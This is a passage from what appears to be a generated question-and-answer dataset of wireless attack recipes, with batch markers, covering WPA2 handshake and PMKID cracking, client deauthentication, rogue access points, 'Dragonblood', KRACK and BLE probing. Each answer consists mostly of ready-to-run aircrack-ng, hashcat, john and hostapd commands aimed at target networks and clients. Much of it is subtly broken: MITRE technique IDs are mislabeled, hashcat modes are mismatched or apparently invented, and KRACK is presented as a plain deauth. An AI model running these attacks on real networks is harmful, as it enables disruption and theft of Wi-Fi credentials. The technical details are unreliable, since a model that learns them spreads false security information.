- Network IDS: anomalies in the traffic patterns.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How do you perform wireless network reconnaissance and mapping?
A: **Technique: Wireless Network Reconnaissance — T1546**

```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Perform network scan with airodump-ng
sudo airodump-ng wlan0mon --scan-time 30
```

**Expected Artifacts/Telemetry:**
- Network IDS: list of SSIDs, BSSIDs, and signal strengths.
- Captured files: `.csv` or `.kismet` files for further analysis.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: What is an example of a BLE (Bluetooth Low Energy) attack?
A: **Technique: Bluetooth Low Energy Attack — T1590.001**

```bash
# Scan for nearby BLE devices
sudo hcitool lescan

# Connect to a target device
sudo gatttool -b <target_MAC> --interactive

# Perform read/write operations
[CONNECTION]> char-read-uuid <UUID>
```

**Expected Artifacts/Telemetry:**
- Bluetooth IDS: increased activity from the target MAC.
- Captured data: values read from BLE characteristics.

**Cleanup Steps:**
```bash
sudo killall hcitool gatttool
```

=== BATCH 18 RETRY 0 ===
===PAIR===
Q: How can I capture a WPA2 handshake to perform offline cracking?
A: **Technique: Handshake Capture \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Capture Handshake:**
```bash
# Start capturing packets for the target network
sudo airodump-ng --bssid <target_BSSID> -c <channel> --write capture wlan0mon

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -0 2 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**
- Captured .cap file with the WPA2 handshake.
- Wireless IDS: increased activity on the target network.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture-*.csv capture-*.cap
```
===PAIR===
Q: What is a good method to detect rogue access points in a corporate environment?
A: **Technique: Rogue AP Detection \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Scan for all visible networks
sudo airodump-ng wlan0mon --encrypt wpa,wpa2,none
```

**Step 2 \u2014 Compare Known Networks:**
- Compare the list of SSIDs with known corporate network names.
- Look for unfamiliar or duplicate SSIDs.

**Artifacts:**
- List of all visible networks and their BSSIDs.
- Potential rogue APs identified by unusual SSIDs or signal strengths.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I perform a PMKID attack on a WPA2 network?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Capture PMKIDs:**
```bash
# Start capturing packets for the target network
sudo airodump-ng --bssid <target_BSSID> -c <channel> --write capture wlan0mon

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -0 2 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Crack PMKIDs:**
```bash
# Convert captured .cap file to hccapx format
aircrack-ng capture-*.cap --hccapx=pmkids.hccapx

# Use hashcat to crack the PMKIDs
hashcat -m 2500 pmkids.hccapx wordlist.txt
```

**Artifacts:**
- Captured .cap file with PMKIDs.
- Cracked passwords from hashcat output.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture-*.csv capture-*.cap pmkids.hccapx
```
===PAIR===
Q: Can you explain how to perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Capture Dragonblood Packets:**
```bash
# Start capturing packets for the target network
sudo airodump-ng --bssid <target_BSSID> -c <channel> --write capture wlan0mon

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -0 2 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Crack Dragonblood:**
```bash
# Convert captured .cap file to hccapx format
aircrack-ng capture-*.cap --hccapx=dragonblood.hccapx

# Use hashcat to crack the Dragonblood packets
hashcat -m 16800 dragonblood.hccapx wordlist.txt
```

**Artifacts:**
- Captured .cap file with Dragonblood packets.
- Cracked passwords from hashcat output.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture-*.csv capture-*.cap dragonblood.hccapx
```
===PAIR===
Q: How can I use KRACK to force a rekeying of WPA2 keys?
A: **Technique: Key Reinstallation Attack (KRACK) \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Perform KRACK Attack:**
```bash
# Start capturing packets for the target network
sudo airodump-ng --bssid <target_BSSID> -c <channel> --write capture wlan0mon

# Use aireplay to force rekeying
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**
- Captured .cap file with packets showing rekeying.
- Wireless IDS: increased activity on the target network.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture-*.csv capture-*.cap
```
===PAIR===
Q: What is a good method to perform wireless network reconnaissance and mapping?
A: **Technique: Network Reconnaissance \u2014 T1590.001**

**Step 1 \u2014 Scan for Networks:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Scan for all visible networks
sudo airodump-ng wlan0mon --encrypt wpa,wpa2,none
```

**Step 2 \u2014 Map Network Topology:**
- Use the list of SSIDs and BSSIDs to map network topology.
- Identify access points, clients, and potential security gaps.

**Artifacts:**
- List of all visible networks with their BSSIDs, channels, and encryption types.
- Visual maps or diagrams of network layout.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```

=== BATCH 19 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture the WPA2 handshake:**
```bash
# Start capturing packets from the target network
sudo airodump-ng -c <channel> --bssid <target_BSSID> -w capture wlan0mon &
# Wait until you see the "WPA handshake" message in the output.
```

**Step 3 — Stop capturing and crack the password:**
```bash
# Kill the airodump process
sudo killall airodump-ng

# Use john to crack the WPA2 PSK from the capture file
john --wordlist=wordlist.txt capture-01.cap
```

**Artifacts:**
- Captured .cap files in the current directory.
- Cracked passwords displayed by john.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: Can you explain how to perform a deauthentication attack on a WPA/WPA2 network?
A: **Technique: WPA/WPA2 Deauthentication Attack — T1595.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network and clients
sudo airodump-ng wlan0mon --encrypt wpa,wpa2
# Note: BSSID, channel, ESSID of target network; MAC addresses of connected clients.
```

**Step 2 — Perform deauthentication attack:**
```bash
# Deauthenticate all associated clients
sudo aireplay-ng -0 10 -a <target_BSSID> wlan0mon

# Optionally, deauthenticate a specific client
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**
- Network clients may disconnect and reconnect.
- IDS logs showing multiple disconnection events.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: What is a rogue access point, and how can I set one up?
A: **Technique: Rogue Access Point Setup — T1590.001**

**Step 1 — Configure wireless interface:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Change to managed mode for the rogue AP
sudo ip link set wlan1 down
sudo iwconfig wlan1 mode Managed
sudo ip link set wlan1 up
```

**Step 2 — Start the rogue access point:**
```bash
# Install hostapd and dnsmasq
sudo apt install hostapd dnsmasq

# Configure hostapd
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start hostapd
sudo hostapd /tmp/hostapd.conf &
```

**Step 3 — Configure and start DNSmasq:**
```bash
# Configure dnsmasq
cat > /etc/dnsmasq.conf << 'EOF'
interface=wlan1
dhcp-range=192.168.100.10,192.168.100.254,12h
EOF

# Start dnsmasq
sudo systemctl start dnsmasq
```

**Artifacts:**
- New AP visible with ESSID "RogueWiFi".
- Clients may connect to the rogue network.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo killall hostapd
sudo systemctl stop dnsmasq
rm /tmp/hostapd.conf
```
===PAIR===
Q: How can I detect and analyze PMKID attacks on WPA2 networks?
A: **Technique: PMKID Attack Detection — T1590.001**

**Step 1 — Capture packets with airodump-ng:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Start capturing packets
sudo airodump-ng --bssid <target_BSSID> -w pmkid_capture wlan0mon &
```

**Step 2 — Stop capturing and analyze PMKIDs:**
```bash
# Kill the airodump process
sudo killall airodump-ng

# Use aircrack-ng to find PMKIDs
sudo aircrack-ng --pmkfile=pmkid_list.txt pmkid_capture-01.cap
```

**Artifacts:**
- Captured .cap files with PMKID information.
- Cracked PSKs displayed by aircrack-ng.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm pmkid_capture*
```
===PAIR===
Q: What is the impact of KRACK (Key Reinstallation Attacks) on WPA2 networks?
A: **Technique: KRACK Attack — T1595.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network and clients
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 — Perform KRACK attack:**
```bash
# Deauthenticate the client to force reassociation
sudo aireplay-ng -0 1 -a <target_BSSID> -c <client_MAC> wlan0mon

# Capture packets during reassociation
sudo airodump-ng --bssid <target_BSSID> -w krack_capture wlan0mon &
```

**Step 3 — Analyze the captured data:**
```bash
# Kill the airodump process
sudo killall airodump-ng

# Use tshark to analyze the packets for rekeying
tshark -r krack_capture-01.cap -Y 'wlan.fc.retry' | grep "Key Reinstallation"
```

**Artifacts:**
- Captured .cap files with rekeying information.
- IDS logs showing potential KRACK indicators.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm krack_capture*
```
===PAIR===
Q: How can I perform Bluetooth Low Energy (BLE) attacks to gather device information?
A: **Technique: BLE Device Information Gathering — T1546**

**Step 1 — Scan for BLE devices:**
```bash
# Use hcitool or bluetoothctl to scan for BLE devices
hcitool lescan

# Or, use bluetoothctl in interactive mode
bluetoothctl power on
bluetoothctl le on
bluetoothctl scan on
```

**Step 2 — Gather specific device information:**
```bash
# Connect to a BLE device and read characteristics
gatttool -b <device_address> --char-read -a <attribute_handle>
```

**Artifacts:**
- List of discovered BLE devices.
- Characteristic values from connected devices.

**Cleanup:**
```bash
bluetoothctl scan off
```
These pairs cover various wireless attack techniques, including deauthentication attacks, rogue access points, evil twin setups, WPA2 handshake capture and cracking, KRACK attacks, and BLE information gathering. Each response includes the technique name, MITRE ID, exact commands, expected artifacts/telemetry, and cleanup steps.

=== BATCH 20 RETRY 0 ===
===PAIR===
Q: How can I capture the WPA2 handshake from a client on a target network?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network and client
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel>
```

**Step 2 \u2014 Deauthentication attack:**  
```bash
# Force the client to reassociate, capturing the handshake
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**  
- Captured handshakes saved in a .cap file.
- Network monitoring: increased traffic and disconnections.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: What is a good method to identify potential rogue access points on the network?
A: **Technique: Wireless Network Reconnaissance \u2014 T1590.001 (Rogue Access Point setup)**

**Step 1 \u2014 Scan for all visible networks:**  
```bash
# Put wireless adapter in managed mode
sudo iwconfig wlan0 mode managed

# Perform a scan
sudo iwlist wlan0 scanning | grep -i "essid"
```

**Step 2 \u2014 Compare with known networks:**  
```bash
# List of known SSIDs
known_ssids=("NetworkA" "NetworkB")

# Identify unknown or unexpected SSIDs
unknown_ssids=$(sudo iwlist wlan0 scanning | grep -i "essid" | awk '{print $2}' | tr -d '"' | sort | uniq)
for ssid in ${unknown_ssids[@]}; do
    if [[ ! " ${known_ssids[@]} " =~ " ${ssid} " ]]; then
        echo "Unknown SSID: $ssid"
    fi
done
```

**Artifacts:**  
- List of unknown or unexpected SSIDs.
- Network monitoring: signal strength and channel information.

**Cleanup:**  
```bash
# No specific cleanup needed for iwconfig or iwlist
```
===PAIR===
Q: How can I perform a PMKID attack to crack WPA2 passwords?
A: **Technique: PMKID Attack \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 Put wireless adapter in monitor mode:**  
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Start capturing with airodump-ng
sudo airodump-ng --bssid <target_BSSID> --channel <target_channel> -w capture wlan0mon
```

**Step 3 \u2014 Crack the captured PMKID:**  
```bash
# Use hashcat to crack the PMKIDs
hashcat -m 16800 capture-01.kismet.nettxt wordlist.txt
```

**Artifacts:**  
- Captured PMKIDs saved in .kismet.nettxt.
- Cracked passwords displayed by hashcat.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: Can you explain how to set up a rogue access point and what tools are commonly used?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001 (Rogue Access Point setup)**

**Step 1 \u2014 Configure wireless interface:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Set up another interface for the rogue AP
sudo iwconfig wlan1 essid "FreeWiFi" channel 6
```

**Step 2 \u2014 Start the rogue access point:**  
```bash
# Use hostapd to create the AP
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=s3cr3t
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/hostapd.conf &
```

**Artifacts:**  
- New SSID "FreeWiFi" visible to wireless devices.
- Network monitoring: increased traffic and client associations.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
sudo killall hostapd
rm /tmp/hostapd.conf
```
===PAIR===
Q: What is the impact of KRACK attacks on WPA2 networks?
A: **Technique: Key Reinstallation Attacks (KRACK) \u2014 T1595.001 (WPA/WPA2 deauthentication attacks)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network and client
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel>
```

**Step 2 \u2014 Perform deauthentication attack:**  
```bash
# Force the client to reassociate, triggering KRACK
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**  
- Network monitoring: increased traffic and potential packet loss.
- Client logs: possible connectivity issues or error messages.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I perform a BLE scan to identify nearby devices?
A: **Technique: Bluetooth Low Energy (BLE) Attacks \u2014 T1590.001 (Rogue Access Point setup)**

**Step 1 \u2014 Scan for BLE devices:**  
```bash
# Use hcidump or hcitool to scan
sudo hcidump -a
```

**Artifacts:**  
- List of nearby BLE devices, including MAC addresses and names.

**Cleanup:**  
```bash
# No specific cleanup needed for hcidump or hcitool
```

=== BATCH 21 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking during my penetration test?
A: **Technique: WPA2 Handshake Capture and Offline Cracking — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture the WPA2 handshake:**
```bash
# Start capturing packets on the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write wpa_handshake
```

**Step 3 — Deauthenticate a client to capture the handshake:**
```bash
# Force client disassociation
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 — Crack the captured handshake using a wordlist:**
```bash
# Use aircrack-ng to crack the WPA2 password
sudo aircrack-ng wpa_handshake-<BSSID>.cap -w wordlist.txt
```

**Artifacts:**
- Captured `.cap` files with the WPA2 handshake.
- Cracked passwords in the terminal output.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm wpa_handshake-<BSSID>.cap
```
===PAIR===
Q: What is a common method to disrupt wireless connectivity during an attack?
A: **Technique: WPA/WPA2 Deauthentication Attacks — T1595.001**

**Step 1 — Identify the target network:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Deauthenticate clients to disrupt connectivity:**
```bash
# Send deauthentication packets to all clients on the network
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Artifacts:**
- Network monitoring tools show disconnection events.
- Clients may report losing connection.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point during my testing?
A: **Technique: Rogue Access Point Setup — T1590.001**

**Step 1 — Install necessary tools:**
```bash
# Install hostapd and dnsmasq
sudo apt install hostapd dnsmasq
```

**Step 2 — Configure the rogue AP:**
```bash
# Edit hostapd configuration
cat > /etc/hostapd/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
EOF

# Edit dnsmasq configuration
cat > /etc/dnsmasq.conf << 'EOF'
interface=wlan1
dhcp-range=10.0.0.2,10.0.0.50,12h
EOF
```

**Step 3 — Start the rogue AP and DHCP server:**
```bash
# Start hostapd
sudo systemctl start hostapd

# Start dnsmasq
sudo systemctl start dnsmasq
```

**Artifacts:**
- Clients may connect to "RogueWiFi".
- Network monitoring tools show new AP.

**Cleanup:**
```bash
sudo systemctl stop hostapd
sudo systemctl stop dnsmasq
rm /etc/hostapd/hostapd.conf
rm /etc/dnsmasq.conf
```
===PAIR===
Q: Describe a method to capture PMKIDs for WPA2 during testing.
A: **Technique: PMKID Attacks — T1590.001**

**Step 1 — Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 — Capture packets to find PMKIDs:**
```bash
# Start capturing packets on the target network
sudo airodump-ng --bssid <BSSID> --channel <channel> -w pmkid_capture wlan0mon
```

**Step 3 — Extract PMKIDs from captured data:**
```bash
# Use hcxpcapngtool to extract PMKIDs
hcxpcapngtool -z pmkid.hc2x pmkid_capture-<BSSID>.cap
```

**Step 4 — Crack the PMKIDs using a wordlist:**
```bash
# Use hashcat to crack the PMKIDs
hashcat -m 16800 pmkid.hc2x wordlist.txt
```

**Artifacts:**
- Captured `.cap` files with PMKIDs.
- Cracked passwords in the terminal output.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm pmkid_capture-<BSSID>.cap
rm pmkid.hc2x
```
===PAIR===
Q: How can I perform a KRACK attack during my testing?
A: **Technique: Key Reinstallation Attacks (KRACK) — T1590.001**

**Step 1 — Identify the target network and client:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network and clients
sudo airodump-ng wlan0mon --encrypt ccmp
```

**Step 2 — Deauthenticate the client to trigger rekeying:**
```bash
# Send deauthentication packets to the client
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 — Capture the retransmitted key frame:**
```bash
# Start capturing packets on the target network
sudo airodump-ng --bssid <BSSID> --channel <channel> -w krack_capture wlan0mon
```

**Artifacts:**
- Captured `.cap` files with retransmitted key frames.
- Network monitoring tools show rekeying events.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm krack_capture-<BSSID>.cap
```
===PAIR===
Q: What is a method to gather information about wireless networks in my environment?
A: **Technique: Wireless Network Reconnaissance and Mapping — T1546**

**Step 1 — Scan for available networks:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Perform a network scan
sudo iwlist wlan0mon scanning | grep -i "ssid"
```

**Step 2 — Use tools like `airodump-ng` for detailed information:**
```bash
# Start capturing packets to gather more details
sudo airodump-ng wlan0mon --write scan_results
```

**Artifacts:**
- List of SSIDs and their BSSIDs.
- Detailed network information in the `.csv` file.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm scan_results*
```

=== BATCH 22 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking during a penetration test?
A: **Technique: WPA2 Handshake Capture and Offline Cracking — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture Handshake:**
```bash
# Start capturing packets to save the handshake
sudo airodump-ng -c <channel> -d <BSSID> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 — Deauthenticate Clients:**
```bash
# Force clients to reconnect and capture new handshake
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 — Stop Capture:**
```bash
# Press Ctrl+C in the airodump-ng window to stop capturing.
```

**Step 5 — Crack Handshake:**
```bash
# Use john the ripper or hashcat to crack the captured handshake
john --wordlist=wordlist.txt capture-01.cap
# Or with hashcat:
hashcat -m 2500 capture-01.cap wordlist.txt
```

**Artifacts:**
- Captured .cap files in the current directory.
- Cracked passwords logged by john or hashcat.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good method to detect KRACK (Key Reinstallation Attacks) during testing?
A: **Technique: Detecting KRACK — T1546**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture Packets:**
```bash
# Start capturing packets to analyze for KRACK
sudo airodump-ng -c <channel> -d <BSSID> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 — Check for Reinstallation:**
```bash
# Use aireplay-ng to check for key reinstallation
sudo aireplay-ng -r capture-01.cap wlan0mon
```

**Artifacts:**
- Captured .cap files in the current directory.
- Aireplay output indicating any key reinstallation events.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I set up a rogue access point during testing?
A: **Technique: Rogue Access Point Setup — T1590.001**

**Step 1 — Install Required Tools:**
```bash
sudo apt install hostapd dnsmasq
```

**Step 2 — Configure Hostapd:**
```bash
# Create configuration file for hostapd
cat > /etc/hostapd/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

**Step 3 — Configure Dnsmasq:**
```bash
# Create configuration file for dnsmasq
cat > /etc/dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.1.50,192.168.1.100,12h
EOF
```

**Step 4 — Start Services:**
```bash
# Enable and start hostapd and dnsmasq
sudo systemctl enable hostapd
sudo systemctl enable dnsmasq
sudo systemctl start hostapd
sudo systemctl start dnsmasq
```

**Artifacts:**
- New AP visible with SSID "RogueWiFi".
- Clients connecting to it will receive IP addresses in the 192.168.1.x range.

**Cleanup:**
```bash
sudo systemctl stop hostapd
sudo systemctl stop dnsmasq
rm /etc/hostapd/hostapd.conf
rm /etc/dnsmasq.conf
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of target WPA3 network
```

**Step 2 — Capture Dragonblood Packets:**
```bash
# Start capturing packets to save the Dragonblood exchange
sudo airodump-ng -c <channel> -d <BSSID> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 — Deauthenticate Clients:**
```bash
# Force clients to reconnect and capture new Dragonblood exchange
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 — Stop Capture:**
```bash
# Press Ctrl+C in the airodump-ng window to stop capturing.
```

**Step 5 — Crack Dragonblood:**
```bash
# Use john the ripper or hashcat to crack the captured Dragonblood packet
john --wordlist=wordlist.txt capture-01.cap
# Or with hashcat:
hashcat -m 26123 capture-01.cap wordlist.txt
```

**Artifacts:**
- Captured .cap files in the current directory.
- Cracked passwords logged by john or hashcat.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I perform a WPA/WPA2 deauthentication attack to disrupt network traffic?
A: **Technique: WPA/WPA2 Deauthentication Attack — T1595.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa,wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Deauthenticate Clients:**
```bash
# Force clients to disconnect from the network
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**
- Disrupted network traffic for the target clients.
- Client logs indicating disconnection and reconnection attempts.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I use PMKID attacks to capture WPA2 keys?
A: **Technique: PMKID Attack — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture PMKID:**
```bash
# Start capturing packets to save the PMKID
sudo airodump-ng -c <channel> -d <BSSID> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 — Deauthenticate Clients (optional):**
```bash
# Force clients to reconnect and capture new PMKIDs
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 — Stop Capture:**
```bash
# Press Ctrl+C in the airodump-ng window to stop capturing.
```

**Step 5 — Crack PMKID:**
```bash
# Use john the ripper or hashcat to crack the captured PMKID
john --wordlist=wordlist.txt capture-01.cap
# Or with hashcat:
hashcat -m 2500 capture-01.cap wordlist.txt
```

**Artifacts:**
- Captured .cap files in the current directory.
- Cracked passwords logged by john or hashcat.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```

=== BATCH 23 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking during my penetration test?
A: **Technique: WPA2 Handshake Capture and Offline Cracking — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 — Capture Handshake:**
```bash
# Start capturing packets
sudo airodump-ng -c <channel> -d <BSSID> --write output wlan0mon &
```

**Step 3 — Deauthenticate Client to Force Reauthentication:**
```bash
# Deauth the client to capture handshake
sudo aireplay-ng -deauth 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 — Stop Airodump and Crack Handshake:**
```bash
# Stop airodump
killall airodump-ng

# Use john the ripper to crack WPA2 PSK
john --wordlist=wordlist.txt output-01.cap
```

**Artifacts:**  
- Captured handshake file (`output-01.cap`)
- Cracked password in `john` output

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm output*
```
===PAIR===
Q: Can you explain how to use KRACK (Key Reinstallation Attacks) during a wireless penetration test?
A: **Technique: KRACK — T1595.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 — Capture Packets:**
```bash
# Start capturing packets
sudo airodump-ng -c <channel> -d <BSSID> --write output wlan0mon &
```

**Step 3 — Deauthenticate Client to Force Reauthentication:**
```bash
# Deauth the client to capture handshake
sudo aireplay-ng -deauth 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 — Stop Airodump and Analyze Packets:**
```bash
# Stop airodump
killall airodump-ng

# Use tcpdump to check for retransmitted packets
tcpdump -r output-01.cap | grep Repeated
```

**Artifacts:**  
- Captured packet file (`output-01.cap`)
- Retransmitted packets indicating potential KRACK vulnerability

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm output*
```
===PAIR===
Q: How can I perform a PMKID attack for WPA2 during my penetration test?
A: **Technique: PMKID Attack — T1590.001**

